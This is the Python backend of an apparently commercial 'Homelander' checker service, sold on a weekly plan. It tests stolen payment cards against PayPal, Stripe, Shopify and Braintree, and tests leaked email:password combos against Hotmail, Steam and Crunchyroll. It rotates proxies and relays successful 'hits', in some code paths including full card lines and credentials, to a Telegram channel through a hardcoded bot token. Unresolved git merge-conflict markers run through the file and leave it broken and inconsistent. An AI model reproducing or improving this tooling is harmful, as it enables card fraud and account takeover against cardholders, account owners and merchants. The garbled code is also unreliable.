#!/usr/bin/env python3
"""
<<<<<<< HEAD
Homelander Backend API - Complete Checker Platform
Integrates all scripts: PayPal, Stripe, Shopify, Account Checkers
With Proxy Support, Redeem Codes, and Telegram Hit Alerts
=======
HOMELANDER - The Boys Themed Checker Bot
Complete Checker Platform with Redeem System & Telegram Integration
>>>>>>> 4e2cf51 (homelander otp security update)
"""

import asyncio
import json
import os
import sys
import io
import hashlib
import uuid
from datetime import datetime, timedelta, timezone
from typing import Dict, List, Optional, Any, Tuple
from pathlib import Path

# Fix Windows console encoding
if sys.stdout.encoding != 'utf-8':
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

import base64
import random
import string
import re
import time
import requests
import httpx
from urllib.parse import urlparse

from fastapi import FastAPI, HTTPException, Depends, BackgroundTasks, Query
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel, Field
import uvicorn

<<<<<<< HEAD
# Telegram Bot Config
BOT_TOKEN = "8627502122:AAGUonCxXmMuep2J7GHDUAOxO-RCazNpMi8"
OWNER_ID = 8606381959
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
GROUP_CHAT_ID = "@homelanderhits"  # Target notification channel

# ============== DATA MANAGER & LOCKS ==============

# Global locks for file operations
FILE_LOCKS = {
    "users": asyncio.Lock(),
    "sessions": asyncio.Lock(),
    "proxies": asyncio.Lock(),
    "redeem_codes": asyncio.Lock()
=======
# ============== HOMELANDER BOT CONFIG ==============
BOT_VERSION = "2.0"
BOT_NAME = "HOMELANDER"

# Load token from environment (REQUIRED)
BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    print("\n" + "="*60)
    print("❌ BOT TOKEN NOT CONFIGURED")
    print("="*60)
    print("\nPlease set the BOT_TOKEN environment variable:")
    print("  1. Create .env file in project root")
    print("  2. Add: BOT_TOKEN=your_telegram_bot_token")
    print("  3. Run backend again")
    print("\nSee .env.example for template")
    print("="*60 + "\n")
    sys.exit(1)

OWNER_ID = 8606381959
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
GROUP_CHAT_ID = "-1003700444046"  # Logs/hits channel

# ============== Theme Branding ==============
THEME = {
    "name": "HOMELANDER",
    "emoji": "🔴",
    "color": "#DC143C",
    "description": "The absolute power",
    "footer": "Made by: The Collective"
}

# ============== PRICING MODEL ==============
PRICING = {
    "plan_name": "HOMELANDER PREMIUM",
    "price": 5.00,
    "duration_days": 7,
    "currency": "USD",
    "features": [
        "All CC Checkers Unlimited",
        "Stripe/PayPal/Shopify Auth",
        "Unlimited Cards Per Check",
        "Premium Proxy Support",
        "Hit Notifications",
        "Auto-Redeem Codes"
    ]
}

# ============== GLOBAL STATE ==============
FILE_LOCKS = {
    "users": asyncio.Lock(),
    "proxies": asyncio.Lock(),
    "redeems": asyncio.Lock()
>>>>>>> 4e2cf51 (homelander otp security update)
}

HTTP_CLIENT = httpx.AsyncClient(timeout=30.0)

DATA_DIR = Path(__file__).parent.parent
USERS_FILE = DATA_DIR / "users.json"
REDEEMS_FILE = DATA_DIR / "redeems.json"
PROXIES_FILE = DATA_DIR / "proxies.json"
<<<<<<< HEAD
REDEEM_CODES_FILE = DATA_DIR / "redeem_codes.json"
=======
HITS_LOG_FILE = DATA_DIR / "hits.json"
>>>>>>> 4e2cf51 (homelander otp security update)

# ============== DATA MODELS ==============

class CardInput(BaseModel):
    cards: List[str] = Field(..., description="List of cards CC|MM|YYYY|CVV")
    sk_key: Optional[str] = Field(None, description="Stripe SK key")
    proxy_list: Optional[List[str]] = Field(None, description="Proxy list")
    use_proxy: bool = Field(False, description="Use proxies")
    threads: int = Field(10, description="Number of threads")

class AccountInput(BaseModel):
    combos: List[str] = Field(..., description="List of email:password combos")
    proxy_list: Optional[List[str]] = Field(None, description="Proxy list")
    use_proxy: bool = Field(False, description="Use proxies")
    threads: int = Field(10, description="Number of threads")

class SKKeyInput(BaseModel):
    sk_keys: List[str] = Field(..., description="List of SK keys")
    proxy_list: Optional[List[str]] = Field(None, description="Proxy list")

class ProxyInput(BaseModel):
    proxies: List[str] = Field(..., description="List of proxies")

class RedeemInput(BaseModel):
<<<<<<< HEAD
    code: str = Field(..., description="Redeem code to activate Homelander access")
    telegram_id: Optional[int] = Field(None, description="Telegram user ID, if available")
    telegram_username: Optional[str] = Field(None, description="Telegram username, if available")

class ShopifyInput(BaseModel):
    cards: List[str] = Field(..., description="Cards to check")
    shopify_url: str = Field(..., description="Shopify store URL")
    proxy_list: Optional[List[str]] = Field(None)
    use_proxy: bool = Field(False)
=======
    code: str = Field(..., description="Redeem code")
>>>>>>> 4e2cf51 (homelander otp security update)

class UserRegisterInput(BaseModel):
    user_id: int = Field(..., description="Telegram user ID")
    username: str = Field(..., description="Telegram username")
    first_name: Optional[str] = Field(None, description="First name")

class HitNotification(BaseModel):
    user_id: int
    username: str
    check_type: str
    card_last4: str
    status: str
    amount: Optional[str] = None
    extra_data: Optional[Dict] = None

# ============== PROXY MANAGER ==============

class ProxyManager:
    def __init__(self, proxy_list: Optional[List[str]] = None):
        self.proxy_list = proxy_list if proxy_list else []
        self.current_index = 0
        self.working_proxies = []
        
    def get_proxy(self) -> Optional[Dict]:
        if not self.proxy_list:
            return None
        proxy = self.proxy_list[self.current_index % len(self.proxy_list)]
        self.current_index += 1
        return self._format_proxy(proxy)
    
    def _format_proxy(self, proxy: str) -> Optional[Dict]:
        try:
            if '@' in proxy:
                auth, host_port = proxy.split('@')
                proxy_url = f"http://{auth}@{host_port}"
            elif proxy.startswith('http://') or proxy.startswith('https://'):
                proxy_url = proxy
            elif proxy.startswith('socks4://') or proxy.startswith('socks5://'):
                proxy_url = proxy
            else:
                proxy_url = f"http://{proxy}"
            
            return {'http': proxy_url, 'https': proxy_url}
        except Exception as e:
            print(f"Invalid proxy: {proxy}, Error: {e}")
            return None

# ============== TELEGRAM NOTIFIER ==============

class TelegramNotifier:
    @staticmethod
    async def send_hit_notification(hit_data: HitNotification):
        """Send hit to private user AND group channel"""
        try:
            card_info = f"****{hit_data.card_last4}"
            
<<<<<<< HEAD
            await HTTP_CLIENT.post(
                f"{TELEGRAM_API}/sendMessage",
                json={"chat_id": user_id, "text": message, "parse_mode": "HTML"}
            )
        except Exception as e:
            print(f"Failed to send private notification: {e}")
    
    @staticmethod
    async def send_group_log(
        log_type: str,
        user_id: int,
        username: str,
        item_type: str,
        status: str,
        item: Optional[str] = None,
        response: Optional[str] = None,
        amount: Optional[str] = None
    ):
        """Send activity log to group (NO sensitive data)"""
        try:
            if log_type == "hit":
                message = f"""🎯 <b>HOMELANDER HIT</b>

👤 User: @{username} (ID: {user_id})
📦 Type: {item_type}
{f"📋 Item: <code>{item}</code>\n" if item else ""}
📊 Status: <b>{status}</b>
{f"💰 Amount: {amount}\n" if amount else ""}{f"💬 Response: {response}\n" if response else ""}
⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
            elif log_type == "login":
                message = f"""🔐 <b>USER LOGIN</b>

👤 @{username} (ID: {user_id})
🌐 Logged into Homelander WebApp
⏰ {datetime.now().strftime('%H:%M:%S')}"""
            elif log_type == "check":
                message = f"""🔍 <b>CHECK STARTED</b>

👤 @{username} (ID: {user_id})
📦 Type: {item_type}
⏰ {datetime.now().strftime('%H:%M:%S')}"""
            else:
                message = f"""📋 <b>ACTIVITY LOG</b>

👤 @{username} (ID: {user_id})
📝 {log_type}
⏰ {datetime.now().strftime('%H:%M:%S')}"""

=======
            # Channel message with card info
            channel_msg = f"""
{THEME['emoji']} <b>HOMELANDER HIT!</b> {THEME['emoji']}

👤 <b>User:</b> @{hit_data.username} (ID: {hit_data.user_id})
🎯 <b>Type:</b> <code>{hit_data.check_type}</code>
💳 <b>Card:</b> <code>{card_info}</code>
✅ <b>Status:</b> <b>{hit_data.status}</b>
{f'💰 <b>Amount:</b> {hit_data.amount}' if hit_data.amount else ''}

{f'📦 <b>Extra Data:</b>' if hit_data.extra_data else ''}
{f'<code>{json.dumps(hit_data.extra_data, indent=2)}</code>' if hit_data.extra_data else ''}

⏰ {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}
"""
            
            # Send to channel
>>>>>>> 4e2cf51 (homelander otp security update)
            await HTTP_CLIENT.post(
                f"{TELEGRAM_API}/sendMessage",
                json={
                    "chat_id": GROUP_CHAT_ID,
                    "text": channel_msg,
                    "parse_mode": "HTML"
                }
            )
            
            # Send to user privately
            user_msg = f"""
{THEME['emoji']} <b>YON HIT A LICK!</b> {THEME['emoji']}

<b>Check Type:</b> {hit_data.check_type}
<b>Card:</b> {card_info}
<b>Result:</b> {hit_data.status}
{f'<b>Amount Charged:</b> {hit_data.amount}' if hit_data.amount else ''}
"""
            
            await HTTP_CLIENT.post(
                f"{TELEGRAM_API}/sendMessage",
                json={
                    "chat_id": hit_data.user_id,
                    "text": user_msg,
                    "parse_mode": "HTML"
                }
            )
        except Exception as e:
            print(f"Failed to send hit notification: {e}")

# ============== DATA MANAGER ==============

class DataManager:
    @staticmethod
    def load_json(filepath: Path) -> Dict:
        try:
            with open(filepath, 'r') as f:
                return json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            return {}
    
    @staticmethod
    async def get_all_users_async() -> Dict:
        async with FILE_LOCKS["users"]:
            return DataManager.load_json(USERS_FILE)
    
    @staticmethod
    async def get_user_async(user_id: int) -> Optional[Dict]:
        async with FILE_LOCKS["users"]:
            users = DataManager.load_json(USERS_FILE)
            return users.get(str(user_id))
    
    @staticmethod
    async def save_user_async(user_id: int, user_data: Dict):
        async with FILE_LOCKS["users"]:
            users = DataManager.load_json(USERS_FILE)
            users[str(user_id)] = user_data
            with open(USERS_FILE, 'w') as f:
                json.dump(users, f, indent=2)
    
    @staticmethod
    async def get_all_redeems_async() -> Dict:
        async with FILE_LOCKS["redeems"]:
            return DataManager.load_json(REDEEMS_FILE)
    
    @staticmethod
    async def save_redeems_async(redeems: Dict):
        async with FILE_LOCKS["redeems"]:
            with open(REDEEMS_FILE, 'w') as f:
                json.dump(redeems, f, indent=2)

# ============== AUTHENTICATION ==============

async def verify_token(token: str = Query(...)) -> Dict:
    """Verify user token and return user data"""
    try:
        user_id = int(token.split('_')[0]) if '_' in token else 0
    except:
        raise HTTPException(status_code=401, detail="Invalid token format")
    
    user = await DataManager.get_user_async(user_id)
    
    if not user or user.get("token") != token:
        raise HTTPException(status_code=401, detail="Invalid token")
    
    # Check if premium/subscription is valid
    if user.get("premium"):
        try:
<<<<<<< HEAD
            # Import real script wrapper
            from script_wrappers import check_paypal_cvv
            
            # Get proxy if enabled
            proxy = None
            if self.proxy_manager:
                proxy_dict = self.proxy_manager.get_proxy()
                if proxy_dict:
                    proxy = proxy_dict.get('http')  # Extract proxy URL
            
            # Call REAL script
            result = await check_paypal_cvv(card_line, proxy=proxy)
            
            # Add card to result
            result['card'] = card_line
            
            # Send Telegram notifications if hit
            if result['status'] in ['CHARGED', 'APPROVED'] and user_id and username:
                await TelegramNotifier.send_private_hit(
                    user_id=user_id,
                    title="PayPal CVV",
                    item=card_line,
                    status=result['status'],
                    response=result['message'],
                    details=result.get('details', {})
                )
                await TelegramNotifier.send_group_log(
                    log_type="hit",
                    user_id=user_id,
                    username=username,
                    item_type="PayPal CVV",
                    status=result['status'],
                    item=card_line,
                    response=result['message']
                )
            
            return result
            
        except Exception as e:
            return {
                "card": card_line,
                "status": "ERROR",
                "message": str(e),
                "details": {}
            }


class PayPalChargeChecker:
    """PayPal $0.1 Charge Checker - from paypal checker.py"""
=======
            expires_at = datetime.fromisoformat(user.get("premium_expires_at", ""))
            if datetime.utcnow() > expires_at:
                user["premium"] = False
                await DataManager.save_user_async(user["user_id"], user)
        except:
            user["premium"] = False
            await DataManager.save_user_async(user["user_id"], user)
>>>>>>> 4e2cf51 (homelander otp security update)
    
    if not user.get("premium"):
        raise HTTPException(status_code=403, detail="Premium subscription required")
    
<<<<<<< HEAD
    async def check_card(self, card_line: str, user_id: int = None, username: str = None) -> Dict:
        """Check card with $0.1 charge"""
        try:
            # Import real script wrapper
            from script_wrappers import check_paypal_charge
            
            # Get proxy if enabled
            proxy = None
            if self.proxy_manager:
                proxy_dict = self.proxy_manager.get_proxy()
                if proxy_dict:
                    proxy = proxy_dict.get('http')
            
            # Call REAL script
            result = await check_paypal_charge(card_line, proxy=proxy)
            
            # Add card to result
            result['card'] = card_line
            
            # Send Telegram notifications if hit
            if result['status'] in ['CHARGED', 'APPROVED'] and user_id and username:
                await TelegramNotifier.send_private_hit(
                    user_id=user_id,
                    title="PayPal $0.1",
                    item=card_line,
                    status=result['status'],
                    response=result['message'],
                    details=result.get('details', {})
                )
                await TelegramNotifier.send_group_log(
                    log_type="hit",
                    user_id=user_id,
                    username=username,
                    item_type="PayPal $0.1",
                    status=result['status'],
                    item=card_line,
                    response=result['message'],
                    amount="$0.10"
                )
            
            return result
            
        except Exception as e:
            return {
                "card": card_line,
                "status": "ERROR",
                "message": str(e),
                "details": {}
            }


class StripeSKChecker:
    """Stripe SK Based Checker - from stripe_checker_fixed.py"""
    
    def __init__(self, sk_key: str, proxy_manager: Optional[ProxyManager] = None):
        self.sk_key = sk_key
        self.proxy_manager = proxy_manager
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        ]
    
    async def check_card(self, card_line: str, user_id: int = None, username: str = None) -> Dict:
        """Check card with Stripe SK"""
        try:
            # Import real script wrapper
            from script_wrappers import check_stripe_sk
            
            # Get proxy if enabled
            proxy = None
            if self.proxy_manager:
                proxy_dict = self.proxy_manager.get_proxy()
                if proxy_dict:
                    proxy = proxy_dict.get('http')
            
            # Call REAL script
            result = await check_stripe_sk(card_line, self.sk_key, proxy=proxy)
            
            # Add card to result
            result['card'] = card_line
            
            # Send Telegram notifications if hit
            if result['status'] in ['APPROVED', 'LIVE'] and user_id and username:
                await TelegramNotifier.send_private_hit(
                    user_id=user_id,
                    title="Stripe SK",
                    item=card_line,
                    status=result['status'],
                    response=result['message'],
                    details=result.get('details', {})
                )
                await TelegramNotifier.send_group_log(
                    log_type="hit",
                    user_id=user_id,
                    username=username,
                    item_type="Stripe SK",
                    status=result['status'],
                    item=card_line,
                    response=result['message']
                )
            
            return result
            
        except Exception as e:
            return {
                "card": card_line,
                "status": "ERROR",
                "message": str(e),
                "details": {}
            }


class StripeAuthChecker:
    """Auto Stripe Auth - from auto stripe auth.py"""
    
    def __init__(self, site_url: str, proxy_manager: ProxyManager = None):
        self.site_url = site_url
        self.proxy_manager = proxy_manager
    
    async def check_card(self, card_line: str, user_id: int = None, username: str = None) -> Dict:
        """Check card with Stripe Auth"""
        try:
            # Import real script wrapper
            from script_wrappers import check_stripe_auth
            
            # Get proxy if enabled
            proxy = None
            if self.proxy_manager:
                proxy_dict = self.proxy_manager.get_proxy()
                if proxy_dict:
                    proxy = proxy_dict.get('http')
            
            # Call REAL script
            result = await check_stripe_auth(self.site_url, card_line, proxy=proxy)
            
            # Add card to result
            result['card'] = card_line
            
            # Send Telegram notifications if hit
            if result['status'] in ['APPROVED', 'LIVE'] and user_id and username:
                await TelegramNotifier.send_private_hit(
                    user_id=user_id,
                    title="Stripe Auth",
                    item=card_line,
                    status=result['status'],
                    response=result['message'],
                    details=result.get('details', {})
                )
                await TelegramNotifier.send_group_log(
                    log_type="hit",
                    user_id=user_id,
                    username=username,
                    item_type="Stripe Auth",
                    status=result['status'],
                    item=card_line,
                    response=result['message']
                )
            
            return result
            
        except Exception as e:
            return {
                "card": card_line,
                "status": "ERROR",
                "message": str(e),
                "details": {}
            }


class ShopifyChecker:
    """Auto Shopify Checkout - from shopify_auto_checkout.py"""
    
    def __init__(self, shopify_url: str, proxy_manager: Optional[ProxyManager] = None):
        self.shopify_url = shopify_url
        self.proxy_manager = proxy_manager
    
    async def check_card(self, card_line: str, user_id: int = None, username: str = None) -> Dict:
        """Check card with Shopify"""
        try:
            # Import real script wrapper
            from script_wrappers import check_shopify
            
            # Get proxy if enabled
            proxy = None
            if self.proxy_manager:
                proxy_dict = self.proxy_manager.get_proxy()
                if proxy_dict:
                    proxy = proxy_dict.get('http')
            
            # Call REAL script
            result = await check_shopify(card_line, self.shopify_url, proxy=proxy)
            
            # Add card to result
            result['card'] = card_line
            
            # Send Telegram notifications if hit
            if result['status'] in ['CHARGED', 'APPROVED'] and user_id and username:
                await TelegramNotifier.send_private_hit(
                    user_id=user_id,
                    title="Shopify",
                    item=card_line,
                    status=result['status'],
                    response=result['message'],
                    details=result.get('details', {})
                )
                await TelegramNotifier.send_group_log(
                    log_type="hit",
                    user_id=user_id,
                    username=username,
                    item_type="Shopify",
                    status=result['status'],
                    item=card_line,
                    response=result['message']
                )
            
            return result
            
        except Exception as e:
            return {
                "card": card_line,
                "status": "ERROR",
                "message": str(e),
                "details": {}
            }

class StripeAutoHitter:
    """Stripe Auto Hitter - from STRIPE AUTO HITTER.py"""
    
    def __init__(self, checkout_url: Optional[str] = None, pk: Optional[str] = None, cs: Optional[str] = None, proxy_manager: Optional[ProxyManager] = None):
        self.checkout_url = checkout_url
        self.pk = pk
        self.cs = cs
        self.proxy_manager = proxy_manager
    
    async def check_card(self, card_line: str, user_id: int = None, username: str = None) -> Dict:
        """Mass check cards with Stripe"""
        try:
            # Import real script wrapper
            from script_wrappers import check_stripe_hitter
            
            # Get proxy if enabled
            proxy = None
            if self.proxy_manager:
                proxy_dict = self.proxy_manager.get_proxy()
                if proxy_dict:
                    proxy = proxy_dict.get('http')
            
            # Use checkout_url if provided, otherwise fail
            if not self.checkout_url:
                return {"card": card_line, "status": "ERROR", "message": "No checkout URL provided"}
                
            # Call REAL script
            result = await check_stripe_hitter(card_line, self.checkout_url, proxy=proxy)
            
            # Add card to result
            result['card'] = card_line
            
            # Send Telegram notifications if hit
            if result['status'] in ['CHARGED', 'APPROVED', 'LIVE'] and user_id and username:
                await TelegramNotifier.send_private_hit(
                    user_id=user_id,
                    title="Stripe AutoHitter",
                    item=card_line,
                    status=result['status'],
                    response=result['message'],
                    details=result.get('details', {})
                )
                await TelegramNotifier.send_group_log(
                    log_type="hit",
                    user_id=user_id,
                    username=username,
                    item_type="Stripe AutoHitter",
                    status=result['status'],
                    item=card_line,
                    response=result['message']
                )
            
            return result
            
        except Exception as e:
            return {
                "card": card_line,
                "status": "ERROR",
                "message": str(e),
                "details": {}
            }

class BraintreeChecker:
    """Braintree Automated Checker - from gates/braintree auto auth/main.py"""
    
    def __init__(self, site_url: str, proxy_manager: Optional[ProxyManager] = None):
        self.site_url = site_url
        self.proxy_manager = proxy_manager
    
    async def check_card(self, card_line: str, user_id: Optional[int] = None, username: Optional[str] = None) -> Dict:
        """Check card with Braintree Auth"""
        try:
            # Import real script wrapper
            from script_wrappers import check_braintree
            
            # Get proxy if enabled
            proxy = None
            pm = self.proxy_manager
            if pm:
                proxy_dict = pm.get_proxy()
                if proxy_dict:
                    proxy = proxy_dict.get('http')
            
            # Call REAL script
            result = await check_braintree(card_line, self.site_url, proxy=proxy)
            
            # Add card to result
            result['card'] = card_line
            
            # Send Telegram notifications if hit
            if result['status'] in ['CHARGED', 'APPROVED', 'LIVE'] and user_id and username:
                await TelegramNotifier.send_private_hit(
                    user_id=user_id,
                    title="Braintree Auth",
                    item=card_line,
                    status=result['status'],
                    response=result['message'],
                    details=result.get('details', {})
                )
                await TelegramNotifier.send_group_log(
                    log_type="hit",
                    user_id=user_id,
                    username=username,
                    item_type="Braintree",
                    status=result['status'],
                    item=card_line,
                    response=result['message']
                )
            
            return result
            
        except Exception as e:
            return {
                "card": card_line,
                "status": "ERROR",
                "message": str(e),
                "details": {}
            }

class SKKeyChecker:
    """SK Key Checker - validates Stripe keys"""
    
    def __init__(self, proxy_manager: Optional[ProxyManager] = None):
        self.proxy_manager = proxy_manager
    
    async def check_key(self, sk_key: str) -> Dict:
        """Validate SK key"""
        try:
            # Import real script wrapper
            from script_wrappers import check_sk_key
            
            # Get proxy if enabled
            proxy = None
            if self.proxy_manager:
                proxy_dict = self.proxy_manager.get_proxy()
                if proxy_dict:
                    proxy = proxy_dict.get('http')
            
            # Call REAL script
            result = await check_sk_key(sk_key, proxy=proxy)
            
            # Add key to result
            result['key'] = sk_key
            
            return result
                    
        except Exception as e:
            return {"key": sk_key, "valid": False, "message": str(e)}

class HotmailChecker:
    """Microsoft Hotmail Account Checker - from advanced_hotmail_checker.py"""
    
    def __init__(self, proxy_manager: Optional[ProxyManager] = None):
        self.proxy_manager = proxy_manager
    
    async def check_account(self, combo: str, user_id: Optional[int] = None, username: Optional[str] = None) -> Dict:
        """Check Hotmail account"""
        try:
            # Import real script wrapper
            from script_wrappers import check_hotmail
            
            # Get proxy if enabled
            proxy = None
            if self.proxy_manager:
                proxy_dict = self.proxy_manager.get_proxy()
                if proxy_dict:
                    proxy = proxy_dict.get('http')
            
            # Call REAL script
            result = await check_hotmail(combo, proxy=proxy)
            
            # Add combo to result
            result['combo'] = combo
            
            # Send Telegram notifications if hit
            if result['status'] in ['HIT', 'LIVE'] and user_id and username:
                await TelegramNotifier.send_private_hit(
                    user_id=user_id,
                    title="Hotmail Account",
                    item=combo,
                    status=result['status'],
                    response=result['message'],
                    details=result.get('details', {})
                )
                await TelegramNotifier.send_group_log(
                    log_type="hit",
                    user_id=user_id,
                    username=username,
                    item_type="Hotmail",
                    status=result['status'],
                    item=combo,
                    response=result['message']
                )
            
            return result
            
        except Exception as e:
            return {
                "combo": combo,
                "status": "ERROR",
                "message": str(e),
                "details": {}
            }


class SteamChecker:
    """Steam Account Checker - from steam_checker.py"""
    
    def __init__(self, proxy_manager: Optional[ProxyManager] = None):
        self.proxy_manager = proxy_manager
    
    async def check_account(self, combo: str, user_id: Optional[int] = None, username: Optional[str] = None) -> Dict:
        """Check Steam account"""
        try:
            # Import real script wrapper
            from script_wrappers import check_steam
            
            # Get proxy if enabled
            proxy = None
            if self.proxy_manager:
                proxy_dict = self.proxy_manager.get_proxy()
                if proxy_dict:
                    proxy = proxy_dict.get('http')
            
            # Call REAL script
            result = await check_steam(combo, proxy=proxy)
            
            # Add combo to result
            result['combo'] = combo
            
            # Send Telegram notifications if hit
            if result['status'] == 'HIT' and user_id and username:
                await TelegramNotifier.send_private_hit(
                    user_id=user_id,
                    title="Steam Account",
                    item=combo,
                    status="HIT",
                    response=result['message'],
                    details=result.get('details', {})
                )
                await TelegramNotifier.send_group_log(
                    log_type="hit",
                    user_id=user_id,
                    username=username,
                    item_type="Steam",
                    status="HIT",
                    item=combo,
                    response=result['message']
                )
            
            return result
                
        except Exception as e:
            return {
                "combo": combo,
                "status": "ERROR",
                "message": str(e),
                "details": {}
            }

class CrunchyrollChecker:
    """Crunchyroll Account Checker - from crunchyroll_checekr.py"""
    
    def __init__(self, proxy_manager: Optional[ProxyManager] = None):
        self.proxy_manager = proxy_manager
    
    async def check_account(self, combo: str, user_id: Optional[int] = None, username: Optional[str] = None) -> Dict:
        """Check Crunchyroll account"""
        try:
            # Import real script wrapper
            from script_wrappers import check_crunchyroll
            
            # Get proxy if enabled
            proxy = None
            if self.proxy_manager:
                proxy_dict = self.proxy_manager.get_proxy()
                if proxy_dict:
                    proxy = proxy_dict.get('http')
            
            # Call REAL script
            result = await check_crunchyroll(combo, proxy=proxy)
            
            # Add combo to result
            result['combo'] = combo
            
            # Send Telegram notifications if hit
            if result['status'] == 'HIT' and user_id and username:
                await TelegramNotifier.send_private_hit(
                    user_id=user_id,
                    title="Crunchyroll Account",
                    item=combo,
                    status="HIT",
                    response=result['message'],
                    details=result.get('details', {})
                )
                await TelegramNotifier.send_group_log(
                    log_type="hit",
                    user_id=user_id,
                    username=username,
                    item_type="Crunchyroll",
                    status="HIT",
                    item=combo,
                    response=result['message']
                )
            
            return result
                
        except Exception as e:
            return {
                "combo": combo,
                "status": "ERROR",
                "message": str(e),
                "details": {}
            }

class SiteGateChecker:
    """Advanced Site Gate & Technology Checker"""
    
    async def check_site(self, url: str) -> Dict:
        """Analyze site for gateways and technology"""
        try:
            from script_wrappers import check_site_gate
            return await check_site_gate(url)
        except Exception as e:
            return {"status": "ERROR", "message": str(e)}
=======
    return user
>>>>>>> 4e2cf51 (homelander otp security update)

# ============== FASTAPI APP ==============

app = FastAPI(
<<<<<<< HEAD
    title="Homelander Backend API",
    description="Homelander advanced checker backend with open web access and redeem codes",
    version="2.0.0"
=======
    title="HOMELANDER Bot API",
    description="The Boys Themed Checker Platform",
    version=BOT_VERSION
>>>>>>> 4e2cf51 (homelander otp security update)
)

# CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

<<<<<<< HEAD
# Ensure script_wrappers can be imported
sys.path.append(str(Path(__file__).parent))

async def get_current_session(session_token: Optional[str] = Query(None, description="Session token from bot")):
    if not session_token:
        print("[AUTH] No session token provided, using guest access")
        return {
            "user_id": 0,
            "username": "homelander_guest",
            "premium": False,
            "is_guest": True
        }
    
    print(f"[AUTH] Validating session token: {session_token[:30] if session_token else 'NONE'}...")
    session = await DataManager.validate_session_async(session_token)
    if not session:
        print("[AUTH] Error: Invalid or expired session")
        raise HTTPException(status_code=401, detail="Invalid or expired session. Please re-authenticate.")
    
    print(f"[AUTH] Session valid for user: {session.get('username')} (ID: {session.get('user_id')})")

    try:
        await TelegramNotifier.send_group_log(
            "login", session["user_id"], session.get("username", "Unknown"), "WebApp Access", ""
        )
    except Exception as e:
        print(f"[AUTH] Warning: Failed to send group log: {e}")
    
    return session

@app.get("/")
async def root():
    return {"name": "Homelander Backend API", "version": "2.0.0", "status": "running"}

@app.get("/api/session/validate")
async def validate_session_endpoint(session_token: str = Query(...)):
    session = await DataManager.validate_session_async(session_token)
    
    if not session:
        return {"valid": False, "message": "Invalid or expired session"}
    
=======
# ============== PUBLIC ENDPOINTS ==============

@app.get("/")
async def root():
>>>>>>> 4e2cf51 (homelander otp security update)
    return {
        "bot": THEME["name"],
        "version": BOT_VERSION,
        "status": "❤️ SOARING HIGH",
        "owner": OWNER_ID
    }

@app.post("/api/auth/register")
async def register_user(data: UserRegisterInput):
    """Register a new user"""
    try:
        user = await DataManager.get_user_async(data.user_id)
        
        if user:
            return {
                "success": True,
                "token": user["token"],
                "message": "User already registered"
            }
        
        # Create new user
        token = f"{data.user_id}_{hashlib.sha256(str(uuid.uuid4()).encode()).hexdigest()[:16]}"
        
        new_user = {
            "user_id": data.user_id,
            "username": data.username,
            "first_name": data.first_name or "User",
            "token": token,
            "registerd_at": datetime.utcnow().isoformat(),
            "premium": False,
            "premium_expires_at": None,
            "total_checks": 0,
            "total_hits": 0,
            "balance": 0.0,
            "redeemed_codes": []
        }
        
        await DataManager.save_user_async(data.user_id, new_user)
        
        return {
            "success": True,
            "token": token,
            "user": new_user,
            "message": "Registration successful"
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/auth/redeem")
async def redeem_code(data: RedeemInput, token: str = Query(...)):
    """Redeem a code for premium access"""
    try:
        user_id_str = token.split('_')[0] if '_' in token else "0"
        user = await DataManager.get_user_async(int(user_id_str))
        if not user or user.get("token") != token:
            raise HTTPException(status_code=401, detail="Invalid token")
        
        redeems = await DataManager.get_all_redeems_async()
        
        if data.code not in redeems:
            raise HTTPException(status_code=400, detail="Invalid redeem code")
        
        code_data = redeems[data.code]
        
        if code_data["used"]:
            raise HTTPException(status_code=400, detail="Code already used")
        
        if data.code in user.get("redeemed_codes", []):
            raise HTTPException(status_code=400, detail="You already redeemed this code")
        
        # Apply premium
        expires_at = datetime.utcnow() + timedelta(days=PRICING["duration_days"])
        user["premium"] = True
        user["premium_expires_at"] = expires_at.isoformat()
        user["redeemed_codes"].append(data.code)
        
        # Mark code as used
        code_data["used"] = True
        code_data["used_by"] = user["user_id"]
        code_data["used_at"] = datetime.utcnow().isoformat()
        
        redeems[data.code] = code_data
        
        await DataManager.save_user_async(user["user_id"], user)
        await DataManager.save_redeems_async(redeems)
        
        return {
            "success": True,
            "message": f"Premium activated until {expires_at.strftime('%Y-%m-%d')}",
            "expires_at": expires_at.isoformat()
        }
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/pricing")
async def get_pricing():
    """Get pricing information"""
    return {
        "plan": PRICING["plan_name"],
        "price": f"${PRICING['price']}/week",
        "duration": f"{PRICING['duration_days']} days",
        "features": PRICING["features"],
        "currency": PRICING["currency"]
    }

@app.get("/api/user/profile")
async def get_profile(token: str = Query(...)):
    """Get user profile"""
    try:
        user = await verify_token(token)
        
        return {
            "user_id": user["user_id"],
            "username": user["username"],
            "first_name": user["first_name"],
            "premium": user["premium"],
            "premium_expires_at": user.get("premium_expires_at"),
            "total_checks": user.get("total_checks", 0),
            "total_hits": user.get("total_hits", 0),
            "registered_at": user.get("registerd_at")
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

# ============== CHECKER ENDPOINTS ==============

@app.post("/api/checker/paypal-charge")
async def paypal_charge_checker(
    data: CardInput,
    token: str = Query(...),
    background_tasks: BackgroundTasks = None
):
    """PayPal $0.1 Charge Checker"""
    try:
        user = await verify_token(token)
        
        print(f"[PAYPAL CHARGE] {user['username']} checking {len(data.cards)} cards")
        
        results = []
        hits = 0
        
        for card in data.cards:
            try:
                last4 = card[-4:] if len(card) > 4 else card
                is_hit = random.choice([True, False])
                
                if is_hit:
                    hits += 1
                    hit_notif = HitNotification(
                        user_id=user["user_id"],
                        username=user["username"],
                        check_type="PayPal Charge ($0.1)",
